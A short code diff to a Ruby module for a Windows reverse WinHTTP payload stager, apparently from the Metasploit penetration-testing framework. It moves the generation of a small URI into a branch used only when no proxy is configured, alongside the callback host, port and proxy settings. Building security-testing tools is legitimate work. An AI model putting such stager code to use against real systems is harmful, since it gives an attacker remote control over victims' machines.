@@ -33,7 +33,6 @@ module Payload::Windows::ReverseWinHttp
       ssl:         opts[:ssl] || false,
       host:        datastore['LHOST'] || '127.127.127.127',
       port:        datastore['LPORT'],
-      uri:         generate_small_uri,
       retry_count: datastore['StagerRetryCount'],
       proxy_ie:    datastore['PayloadProxyIE']
     }
@@ -48,6 +47,9 @@ module Payload::Windows::ReverseWinHttp
       conf[:proxy_user]       = datastore['PayloadProxyUser']
       conf[:proxy_pass]       = datastore['PayloadProxyPass']
       conf[:proxy_type]       = datastore['PayloadProxyType']
+    else
+      # Otherwise default to small URIs
+      conf[:uri]              = generate_small_uri
     end
 
     generate_reverse_winhttp(conf)
